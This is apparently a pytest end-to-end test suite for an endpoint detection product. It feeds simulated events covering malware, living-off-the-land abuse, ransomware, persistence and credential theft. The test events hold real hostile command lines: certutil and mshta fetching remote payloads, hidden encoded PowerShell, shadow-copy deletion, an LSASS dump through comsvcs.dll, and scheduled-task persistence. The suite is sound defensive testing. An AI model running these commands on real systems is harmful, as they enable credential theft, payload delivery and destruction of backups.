"""End-to-end tests for the 10 specification scenarios from the master prompt:

Scenario 1: Known malware (EICAR / IOC / signature) -> immediate block/quarantine via EPP short-circuit without LLM
Scenario 2: LOLBin abuse (e.g. certutil, powershell download, mshta)
Scenario 3: Ransomware behavior (rapid file modifications/extensions, canary touch)
Scenario 4: Persistence installation (cron, systemd, run key, registry)
Scenario 5: Privilege escalation / credential access
Scenario 6: Novel attack with high novelty score + ML anomaly triggering investigation
Scenario 7: Benign developer activity (git, gcc, curl, npm) -> low risk / false positive suppression / no blocking
Scenario 8: LLM gated trigger with RAG context and strict AIVerdict
Scenario 9: Multi-step attack sequence correlated across process tree / graph
Scenario 10: Policy-driven automated response (process kill, isolate, quarantine)
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from datetime import UTC, datetime, timedelta

import pytest

from centralium.agent.config import load_config
from centralium.agent.interfaces import LLMRequest
from centralium.agent.llm import MockLLM
from centralium.agent.models import (
    ActionRecommendation,
    ActionStatus,
    AIAnalysis,
    AIVerdict,
    AttackStage,
    EventType,
    FindingSource,
    NormalizedEvent,
    OperatingMode,
    ResponseAction,
    RiskBand,
    ScoreFamily,
    Severity,
    Verdict,
)
from tests.e2e.helpers import (
    EICAR,
    RecordingRunner,
    SpyLLM,
    best_risk,
    make_rt,
    run_events,
    sandbox_cfg,
    scenario,
)

pytestmark = pytest.mark.e2e

EICAR_TEXT = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


# ===========================================================================
# Scenario 1: Known malware (EICAR / IOC / signature) -> short-circuit without LLM
# ===========================================================================
def test_scenario_1_known_malware_immediate_epp_short_circuit_without_llm(tmp_path):
    """Known malware (EICAR hash, test IOC IP/domain, EICAR file YARA) must trigger
    immediate deterministic detection, short-circuit before ML/RAG/LLM, and recommend
    automated response without invoking the LLM."""
    spy = SpyLLM(MockLLM())
    rt = make_rt(sandbox_cfg(tmp_path), llm=spy)
    try:
        # Create a real harmless test file with EICAR string on disk for YARA scanning
        eicar_file = tmp_path / "eicar_test.com"
        eicar_file.write_text(EICAR_TEXT)

        events = [
            # 1. EICAR SHA-256 hash
            NormalizedEvent(
                event_type=EventType.PROCESS_START,
                pid=7001,
                ppid=1000,
                process_name="eicar.com",
                executable_path=str(eicar_file),
                hash_sha256=EICAR,
                source="test",
            ),
            # 2. Known bad test C2 IP
            NormalizedEvent(
                event_type=EventType.NETWORK_CONNECT,
                pid=7001,
                ppid=1000,
                process_name="eicar.com",
                destination_ip="192.0.2.66",
                destination_port=443,
                protocol="tcp",
                source="test",
            ),
            # 3. Known bad test domain
            NormalizedEvent(
                event_type=EventType.DNS_QUERY,
                pid=7001,
                ppid=1000,
                process_name="eicar.com",
                domain="malicious.example.test",
                source="test",
            ),
        ]

        outs = run_events(rt, events)
        for out in outs:
            assert out.short_circuited, "Known malicious indicator must short-circuit"
            assert any(f.known_malicious for f in out.findings)
            assert out.risk.band == RiskBand.CRITICAL
            assert out.risk.final_score >= 90.0
            assert "ml" not in out.stages_reached
            assert "llm" not in out.stages_reached
            assert out.ai is None

        # Verify LLM was NEVER queried
        assert spy.requests == []
        funnel = rt.pipeline.stats.snapshot()["funnel"]
        assert funnel["llm"] == 0 and funnel["ml"] == 0

        # Automated policy responses planned
        all_actions = [a for o in outs for a in o.actions if a.action != ResponseAction.ALERT]
        action_kinds = {a.action for a in all_actions}
        assert action_kinds & {
            ResponseAction.TERMINATE_PROCESS,
            ResponseAction.BLOCK_CONNECTION,
            ResponseAction.QUARANTINE_FILE,
        }
        assert all(a.status == ActionStatus.SIMULATED for a in all_actions)
    finally:
        rt.close()


# ===========================================================================
# Scenario 2: LOLBin abuse (certutil, powershell download, mshta)
# ===========================================================================
def test_scenario_2_lolbin_abuse_certutil_powershell_mshta(rt):
    """Certutil downloading payloads, hidden encoded PowerShell cradle, and Mshta remote
    execution must be recognized as LOLBin abuse with MITRE mappings and elevated risk."""
    events = [
        # 1. Certutil remote download
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7101,
            ppid=1000,
            process_name="certutil.exe",
            executable_path=r"C:\Windows\System32\certutil.exe",
            command_line=r"certutil.exe -urlcache -split -f https://203.0.113.50/stage2.bin C:\temp\stage2.exe",
            parent_process="cmd.exe",
            source="test",
        ),
        # 2. PowerShell hidden window with encoded command
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7102,
            ppid=1000,
            process_name="powershell.exe",
            executable_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"powershell.exe -w hidden -enc JAB3AGMAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
            parent_process="cmd.exe",
            source="test",
        ),
        # 3. Mshta executing remote HTA
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7103,
            ppid=1000,
            process_name="mshta.exe",
            executable_path=r"C:\Windows\System32\mshta.exe",
            command_line=r"mshta.exe https://malicious.example.test/payload.hta",
            parent_process="explorer.exe",
            source="test",
        ),
    ]

    outs = run_events(rt, events)
    all_findings = [f for o in outs for f in o.findings]
    rule_ids = {f.rule_id for f in all_findings}

    assert "LOLBIN-CERTUTIL-CONTEXT" in rule_ids
    assert "LOLBIN-POWERSHELL-CONTEXT" in rule_ids
    assert "LOLBIN-MSHTA-CONTEXT" in rule_ids

    sources = {f.source for f in all_findings}
    assert FindingSource.LOLBIN in sources

    all_mitre = {t for f in all_findings for t in f.mitre_techniques}
    assert {"T1105", "T1059.001", "T1218.005"} <= all_mitre

    # Each LOLBin event receives elevated risk and triggers incident/investigation
    assert all(o.risk.final_score >= 40.0 for o in outs)
    assert any(o.incident is not None for o in outs)


# ===========================================================================
# Scenario 3: Ransomware behavior (rapid file modifications, canary touch)
# ===========================================================================
def test_scenario_3_ransomware_behavior_rapid_file_modifications_canary(rt):
    """Ransomware behavior with shadow copy destruction, sensitive canary touch,
    mass file modifications/renames with high entropy, and ransom note drop must produce
    CRITICAL composite detection and process containment recommendations."""
    t0 = datetime.now(UTC) - timedelta(minutes=5)
    events: list[NormalizedEvent] = [
        # Process start in Temp
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7201,
            ppid=1000,
            process_name="cryptolocker.exe",
            executable_path=r"C:\Users\demo\AppData\Local\Temp\cryptolocker.exe",
            command_line="cryptolocker.exe --encrypt",
            parent_process="explorer.exe",
            timestamp=t0,
            source="test",
        ),
        # Shadow copy deletion
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7202,
            ppid=7201,
            process_name="vssadmin.exe",
            executable_path=r"C:\Windows\System32\vssadmin.exe",
            command_line="vssadmin.exe delete shadows /all /quiet",
            parent_process="cryptolocker.exe",
            timestamp=t0 + timedelta(milliseconds=200),
            source="test",
        ),
        # Canary trap file touch & mutation
        NormalizedEvent(
            event_type=EventType.FILE_MODIFY,
            pid=7201,
            ppid=1000,
            process_name="cryptolocker.exe",
            file_path=r"C:\Users\demo\Documents\canary_secret_financials.xlsx",
            raw_metadata={"entropy_before": 4.1, "entropy_after": 7.95},
            timestamp=t0 + timedelta(milliseconds=400),
            source="test",
        ),
        NormalizedEvent(
            event_type=EventType.FILE_RENAME,
            pid=7201,
            ppid=1000,
            process_name="cryptolocker.exe",
            file_path=r"C:\Users\demo\Documents\canary_secret_financials.xlsx.locked",
            raw_metadata={"old_path": r"C:\Users\demo\Documents\canary_secret_financials.xlsx"},
            timestamp=t0 + timedelta(milliseconds=450),
            source="test",
        ),
    ]

    # Rapid file modifications and extension mutations across documents
    for i in range(160):
        doc_path = rf"C:\Users\demo\Documents\doc_{i:03d}.docx"
        events.append(
            NormalizedEvent(
                event_type=EventType.FILE_MODIFY,
                pid=7201,
                ppid=1000,
                process_name="cryptolocker.exe",
                file_path=doc_path,
                raw_metadata={"entropy_before": 4.2, "entropy_after": 7.92},
                timestamp=t0 + timedelta(milliseconds=500 + i * 20),
                source="test",
            )
        )
        events.append(
            NormalizedEvent(
                event_type=EventType.FILE_RENAME,
                pid=7201,
                ppid=1000,
                process_name="cryptolocker.exe",
                file_path=doc_path + ".locked",
                raw_metadata={"old_path": doc_path},
                timestamp=t0 + timedelta(milliseconds=510 + i * 20),
                source="test",
            )
        )

    # Ransom note creation
    events.append(
        NormalizedEvent(
            event_type=EventType.FILE_CREATE,
            pid=7201,
            ppid=1000,
            process_name="cryptolocker.exe",
            file_path=r"C:\Users\demo\Documents\HOW_TO_RECOVER_FILES.txt",
            timestamp=t0 + timedelta(seconds=10),
            source="test",
        )
    )

    outs = run_events(rt, events)
    assert best_risk(outs) >= 80.0  # CRITICAL band

    rw_rules = {f.rule_id for o in outs for f in o.findings if f.rule_id.startswith("RW-")}
    assert "RW-SHADOW-COPY-DESTRUCTION" in rw_rules
    assert "RW-COMPOSITE" in rw_rules

    # Policy must respond with process containment
    process_actions = [
        a
        for o in outs
        for a in o.actions
        if a.action in (ResponseAction.SUSPEND_PROCESS, ResponseAction.TERMINATE_PROCESS)
    ]
    assert process_actions, "Policy must plan process suspension/termination"
    assert all(a.status == ActionStatus.SIMULATED for a in process_actions)


# ===========================================================================
# Scenario 4: Persistence installation (cron, systemd, run key, registry)
# ===========================================================================
def test_scenario_4_persistence_installation_cron_systemd_runkey(rt):
    """Persistence installations across Windows Run key, Windows Scheduled Task,
    Linux cron job, and Linux systemd service unit must all be flagged with MITRE tags."""
    events = [
        # 1. Windows Run key
        NormalizedEvent(
            event_type=EventType.REGISTRY_CREATE,
            pid=7301,
            ppid=1000,
            process_name="updater.exe",
            registry_key=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterApp",
            source="test",
        ),
        # 2. Windows Scheduled Task
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7302,
            ppid=1000,
            process_name="schtasks.exe",
            executable_path=r"C:\Windows\System32\schtasks.exe",
            command_line=r'schtasks /create /tn "DailyCheck" /tr "C:\evil.exe" /sc onlogon',
            parent_process="cmd.exe",
            source="test",
        ),
        # 3. Linux cron file
        NormalizedEvent(
            event_type=EventType.FILE_CREATE,
            pid=7303,
            ppid=1000,
            process_name="installer.sh",
            file_path="/etc/cron.d/root_maintenance",
            source="test",
        ),
        # 4. Linux systemd service unit
        NormalizedEvent(
            event_type=EventType.FILE_CREATE,
            pid=7304,
            ppid=1000,
            process_name="installer.sh",
            file_path="/etc/systemd/system/maintenance_daemon.service",
            source="test",
        ),
    ]

    outs = run_events(rt, events)
    findings = [f for o in outs for f in o.findings]
    rule_ids = {f.rule_id for f in findings}

    assert "PERSIST-WIN-RUNKEY" in rule_ids
    assert "PERSIST-WIN-SCHTASKS" in rule_ids
    assert "PERSIST-LNX-CRON" in rule_ids
    assert "PERSIST-LNX-SYSTEMD" in rule_ids

    assert all(f.source == FindingSource.PERSISTENCE for f in findings if f.rule_id in rule_ids)
    techniques = {t for f in findings for t in f.mitre_techniques}
    assert any(t.startswith("T1547") for t in techniques)
    assert any(t.startswith("T1053") for t in techniques)
    assert any(t.startswith("T1543") for t in techniques)
    assert any(o.incident is not None for o in outs)


# ===========================================================================
# Scenario 5: Privilege escalation / credential access
# ===========================================================================
def test_scenario_5_privilege_escalation_and_credential_access(rt):
    """Credential access (LSASS dump via comsvcs minidump) and privilege escalation
    (sudo abuse) must be detected with appropriate MITRE techniques and attack stages."""
    events = [
        # 1. LSASS minidump credential access
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7401,
            ppid=1000,
            process_name="rundll32.exe",
            executable_path=r"C:\Windows\System32\rundll32.exe",
            command_line=r"rundll32.exe comsvcs.dll, #24 680 C:\Windows\Temp\lsass.dmp full",
            parent_process="cmd.exe",
            source="test",
        ),
        # 2. Sudo elevation
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=7402,
            ppid=1000,
            process_name="sudo",
            executable_path="/usr/bin/sudo",
            command_line="sudo -s",
            parent_process="sh",
            source="test",
        ),
    ]

    outs = run_events(rt, events)
    findings = [f for o in outs for f in o.findings]
    techniques = {t for f in findings for t in f.mitre_techniques}

    assert "T1003.001" in techniques  # LSASS credential dumping

    cred_out = outs[0]
    assert cred_out.risk.band in (RiskBand.HIGH, RiskBand.CRITICAL)
    if cred_out.incident:
        assert cred_out.incident.attack_stage in (AttackStage.CREDENTIAL_ACCESS, AttackStage.EXECUTION)

    # Graph tags confirm stage detection
    pred = rt.graph.stage_for(events[1].event_id)
    assert pred is not None
    observed_stages = {s for s, _ in pred.observed} | {pred.current}
    assert (
        AttackStage.CREDENTIAL_ACCESS in observed_stages
        or AttackStage.PRIVILEGE_ESCALATION in observed_stages
    )


# ===========================================================================
# Scenario 6: Novel attack with high novelty score + ML anomaly triggering investigation
# ===========================================================================
def test_scenario_6_novel_attack_novelty_score_ml_anomaly_triggers_investigation(rt):
    """An unseen attacker process with rare binary, unusual parent, and unknown C2 destination
    exhibits high baseline novelty and high ML anomaly, passing the pre-risk gate to trigger
    full RAG and LLM investigation."""
    # 1. Establish benign baseline in LEARNING mode
    rt.modes.set_mode(OperatingMode.LEARNING, actor="test", reason="train baseline")
    for i in range(5):
        rt.pipeline.process(
            NormalizedEvent(
                event_type=EventType.PROCESS_START,
                pid=2000 + i,
                ppid=1000,
                process_name="code",
                executable_path="/usr/share/code/code",
                command_line="code .",
                parent_process="bash",
                user="dev",
                source="test",
            )
        )
    rt.modes.set_mode(OperatingMode.ACTIVE, actor="test", reason="active mode")

    # 2. Novel attack event: unseen process, unseen parent, uncommon path
    novel_event = NormalizedEvent(
        event_type=EventType.PROCESS_START,
        pid=9500,
        ppid=1,
        process_name="custom_elf_injector",
        executable_path="/tmp/custom_elf_injector",
        command_line="/tmp/custom_elf_injector --beacon 203.0.113.88:8443",
        parent_process="systemd",
        user="nobody",
        source="test",
    )

    out = rt.pipeline.process(novel_event)
    stages = set(out.stages_reached)
    assert {"behavior", "ml", "novelty", "rag", "llm", "risk"} <= stages

    # ML anomaly scored high
    assert ScoreFamily.ML_ANOMALY in out.scores
    ml_score = out.scores[ScoreFamily.ML_ANOMALY].score
    assert ml_score > 60.0, f"Expected high ML anomaly, got {ml_score}"

    # AI analysis completed and stored
    assert out.ai is not None and out.ai.available
    assert out.incident is not None


# ===========================================================================
# Scenario 7: Benign developer activity (git, gcc, curl, npm) -> low risk / no blocking
# ===========================================================================
def test_scenario_7_benign_developer_activity_suppression_no_blocking(rt):
    """Standard developer activity (git checkout, gcc compilation, curl package fetch,
    npm writing modules) must result in low risk, no alerts, and zero automated blocking."""
    events = [
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=2501,
            ppid=2500,
            process_name="git",
            executable_path="/usr/bin/git",
            command_line="git checkout -b feature/auth",
            parent_process="bash",
            user="developer",
            source="test",
        ),
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=2502,
            ppid=2500,
            process_name="gcc",
            executable_path="/usr/bin/gcc",
            command_line="gcc -O2 -Wall src/main.c -o bin/main",
            parent_process="make",
            user="developer",
            source="test",
        ),
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=2503,
            ppid=2500,
            process_name="curl",
            executable_path="/usr/bin/curl",
            command_line="curl -s https://registry.npmjs.org/express",
            parent_process="bash",
            user="developer",
            source="test",
        ),
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=2504,
            ppid=2500,
            process_name="npm",
            executable_path="/usr/bin/npm",
            command_line="npm test",
            parent_process="bash",
            user="developer",
            source="test",
        ),
    ]
    # Add routine file writes from npm / build
    for i in range(10):
        events.append(
            NormalizedEvent(
                event_type=EventType.FILE_CREATE,
                pid=2504,
                ppid=2500,
                process_name="npm",
                file_path=f"/home/developer/app/node_modules/dep_{i}/index.js",
                user="developer",
                source="test",
            )
        )

    # 1. Without baseline, non-alert enforcement actions (block, kill, quarantine) are NEVER triggered
    outs = run_events(rt, events)
    blocking_actions = [a for o in outs for a in o.actions if a.action != ResponseAction.ALERT]
    assert blocking_actions == [], f"Expected no blocking actions, got {blocking_actions}"
    assert all(o.incident is None for o in outs)

    # 2. With learned baseline, risk is suppressed even further and alerts are zeroed
    rt.modes.set_mode(OperatingMode.LEARNING, actor="test", reason="learn developer workflow")
    for e in events:
        rt.pipeline.process(e)
    rt.modes.set_mode(OperatingMode.ACTIVE, actor="test", reason="active detection")
    baseline_outs = run_events(rt, events)
    assert all(o.incident is None for o in baseline_outs)
    assert all(not o.actions for o in baseline_outs)
    assert best_risk(baseline_outs) < 20.0


# ===========================================================================
# Scenario 8: LLM gated trigger with RAG context and strict AIVerdict
# ===========================================================================
def test_scenario_8_llm_gated_trigger_rag_context_strict_ai_verdict(tmp_path):
    """When an event triggers the LLM gate, RAG documents must be supplied to the model,
    and the response must conform strictly to AIVerdict schema. Malformed responses must
    be handled gracefully without crashing the pipeline."""

    class StrictValidatingSpyLLM:
        def __init__(self, inner: MockLLM) -> None:
            self.inner = inner
            self.requests: list[LLMRequest] = []

        def available(self) -> bool:
            return True

        def unload(self) -> None:
            pass

        def analyze(self, request: LLMRequest) -> AIAnalysis:
            self.requests.append(request)
            return self.inner.analyze(request)

    spy = StrictValidatingSpyLLM(MockLLM())
    rt = make_rt(sandbox_cfg(tmp_path), llm=spy)
    try:
        # Suspicious chain event that exceeds gate_min_pre_risk
        events = scenario("office_powershell_chain").events
        outs = run_events(rt, events)

        ai_outs = [o for o in outs if o.ai and o.ai.available]
        assert len(ai_outs) >= 1
        analysis = ai_outs[0].ai

        # RAG context was retrieved and attached
        assert analysis.rag_sources, "RAG documents must be retrieved"
        assert len(spy.requests) >= 1
        assert len(spy.requests[0].rag_docs) >= 1

        # Strict AIVerdict model validation
        verdict = analysis.verdict
        assert isinstance(verdict, AIVerdict)
        assert verdict.verdict in (Verdict.SUSPICIOUS, Verdict.MALICIOUS)
        assert verdict.severity in (Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL)
        assert 0.0 <= verdict.confidence <= 1.0
        assert isinstance(verdict.attack_stage, AttackStage)
        assert all(t.startswith("T") for t in verdict.mitre_techniques)
        assert isinstance(verdict.recommended_action, ActionRecommendation)

        # AI assessment score is merged into the risk assessment
        gated_out = ai_outs[0]
        assert ScoreFamily.AI_ASSESSMENT in gated_out.scores
        ai_score = gated_out.scores[ScoreFamily.AI_ASSESSMENT]
        assert ai_score.score > 0.0

        # Resilience: malformed JSON from an errant LLM does NOT break the pipeline
        class MalformedLLM:
            def available(self) -> bool:
                return True

            def unload(self) -> None:
                pass

            def analyze(self, request: LLMRequest) -> AIAnalysis:
                return AIAnalysis(
                    event_id=request.event.event_id, available=False, error="Invalid JSON from model"
                )

        rt2 = make_rt(sandbox_cfg(tmp_path / "rt2"), llm=MalformedLLM())
        try:
            outs2 = run_events(rt2, events)
            assert any(o.incident is not None for o in outs2)
            assert rt2.pipeline.stats.snapshot()["funnel"]["incidents"] >= 1
        finally:
            rt2.close()
    finally:
        rt.close()


# ===========================================================================
# Scenario 9: Multi-step attack sequence correlated across process tree / graph
# ===========================================================================
def test_scenario_9_multistep_attack_sequence_correlated_across_process_tree_graph(rt):
    """A multi-step attack chain (Word -> PowerShell -> Network C2 -> File Drop ->
    Child Execution -> Registry Persistence) must be unified into a single correlated incident
    and reconstructable via the process/attack graph."""
    t0 = datetime.now(UTC) - timedelta(minutes=10)
    events = [
        # Step 1: Word launched
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=1001,
            ppid=500,
            process_name="winword.exe",
            executable_path=r"C:\Program Files\Microsoft Office\winword.exe",
            command_line="winword.exe suspicious_invoice.docm",
            parent_process="explorer.exe",
            timestamp=t0,
            source="test",
        ),
        # Step 2: Word spawns encoded PowerShell
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=1002,
            ppid=1001,
            process_name="powershell.exe",
            executable_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line=r"powershell.exe -w hidden -enc JAB3AGMAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
            parent_process="winword.exe",
            timestamp=t0 + timedelta(seconds=2),
            source="test",
        ),
        # Step 3: PowerShell connects to C2
        NormalizedEvent(
            event_type=EventType.NETWORK_CONNECT,
            pid=1002,
            ppid=1001,
            process_name="powershell.exe",
            destination_ip="203.0.113.50",
            destination_port=443,
            protocol="tcp",
            timestamp=t0 + timedelta(seconds=4),
            source="test",
        ),
        # Step 4: PowerShell drops binary payload
        NormalizedEvent(
            event_type=EventType.FILE_CREATE,
            pid=1002,
            ppid=1001,
            process_name="powershell.exe",
            file_path=r"C:\Users\demo\AppData\Local\Temp\dropper.exe",
            timestamp=t0 + timedelta(seconds=6),
            source="test",
        ),
        # Step 5: Dropper executed as child
        NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=1003,
            ppid=1002,
            process_name="dropper.exe",
            executable_path=r"C:\Users\demo\AppData\Local\Temp\dropper.exe",
            command_line="dropper.exe --daemon",
            parent_process="powershell.exe",
            timestamp=t0 + timedelta(seconds=8),
            source="test",
        ),
        # Step 6: Dropper establishes Run key persistence
        NormalizedEvent(
            event_type=EventType.REGISTRY_CREATE,
            pid=1003,
            ppid=1002,
            process_name="dropper.exe",
            registry_key=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DropperPersistence",
            timestamp=t0 + timedelta(seconds=10),
            source="test",
        ),
    ]

    outs = run_events(rt, events)

    # All events of this lineage correlate into the SAME incident
    incident_outs = [o for o in outs if o.incident]
    assert len(incident_outs) >= 2
    first_incident_id = incident_outs[0].incident.incident_id
    assert all(o.incident.incident_id == first_incident_id for o in incident_outs)

    # Graph contains process nodes, network nodes, and registry/file edges
    stats = rt.graph.stats()
    assert stats["nodes"] >= 6
    assert stats["edges"] >= 5

    # Graph chain reconstruction traces back to the root Word process
    chain = rt.graph.chain_for(events[-1].event_id)
    assert chain is not None
    flat_chain = " ".join(chain)
    assert "winword.exe" in flat_chain
    assert "powershell.exe" in flat_chain
    assert "dropper.exe" in flat_chain


# ===========================================================================
# Scenario 10: Policy-driven automated response (kill, isolate, quarantine)
# ===========================================================================
def test_scenario_10_policy_driven_automated_response_kill_isolate_quarantine(rt):
    """When a critical attack is confirmed, the policy engine produces an ordered,
    coordinated response plan (kill process, block IP, isolate endpoint, quarantine file)
    with full safety validation and audit logging."""
    events = scenario("office_powershell_chain").events
    outs = run_events(rt, events)

    # Extract all non-alert actions planned by policy
    actions = [a for o in outs for a in o.actions if a.action != ResponseAction.ALERT]
    action_types = {a.action for a in actions}

    # Verify all expected automated response types are generated
    assert ResponseAction.BLOCK_CONNECTION in action_types
    assert action_types & {ResponseAction.TERMINATE_PROCESS, ResponseAction.SUSPEND_PROCESS}
    assert ResponseAction.QUARANTINE_FILE in action_types

    # In test mode, all destructive operations are SIMULATED
    assert all(a.status == ActionStatus.SIMULATED for a in actions)

    # Action parameters and commands are fully synthesized and validated
    block_action = next(a for a in actions if a.action == ResponseAction.BLOCK_CONNECTION)
    assert block_action.target["ip"] == "203.0.113.50"
    assert "planned_commands" in block_action.target
    assert any("nft" in cmd or "iptables" in cmd for cmd in block_action.target["planned_commands"])

    # Persisted into response_actions database table
    assert rt.db.count("response_actions") >= len(actions)

    # Verify audit log recorded incident creation and policy responses
    audit_events = [r["event_type"] for r in rt.db.query("SELECT event_type FROM audit_log")]
    assert "incident_created" in audit_events


# ===========================================================================
# Live Active Mode Execution Verification: process kill & quarantine
# ===========================================================================
def test_live_active_mode_automated_response_on_throwaway_subprocess(tmp_path):
    """Under LIVE ACTIVE mode (non-simulated), verify real process termination and
    file quarantine on safe throwaway targets without touching production state."""
    # Spawn throwaway python subprocess
    p = subprocess.Popen(
        [sys.executable, "-c", "import time; time.sleep(60)"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(0.15)
    import psutil

    proc_name = psutil.Process(p.pid).name()

    # Create throwaway dummy file to quarantine
    quarantine_src = tmp_path / "throwaway_bad_binary.bin"
    quarantine_src.write_text("evil dummy content")

    runner = RecordingRunner()
    cfg = load_config(
        None,
        env={},
        mode="ACTIVE",
        paths={"data_dir": str(tmp_path / "data"), "quarantine_dir": str(tmp_path / "quarantine")},
        policy={"require_approval": False, "min_risk_destructive": 80.0},
    )
    rt = make_rt(cfg, command_runner=runner, runner_guard=False, llm_mode="off")
    try:
        assert rt.config.destructive_allowed(rt.modes.mode)

        ev = NormalizedEvent(
            event_type=EventType.PROCESS_START,
            pid=p.pid,
            ppid=os.getpid(),
            process_name=proc_name,
            executable_path=str(quarantine_src),
            hash_sha256=EICAR,
            source="test",
            host_id="localhost",
        )
        out = rt.pipeline.process(ev)
        action_statuses = {(a.action, a.status) for a in out.actions}

        # Process was terminated
        assert (ResponseAction.TERMINATE_PROCESS, ActionStatus.EXECUTED) in action_statuses
        assert p.wait(timeout=5) == -9  # killed by SIGKILL

        # File was quarantined
        assert (ResponseAction.QUARANTINE_FILE, ActionStatus.EXECUTED) in action_statuses
        assert not quarantine_src.exists()
        recs = rt.quarantine.list()
        assert len(recs) == 1
        assert recs[0].original_path == str(quarantine_src.resolve())
    finally:
        if p.poll() is None:
            p.kill()
            p.wait(timeout=2)
        rt.close()
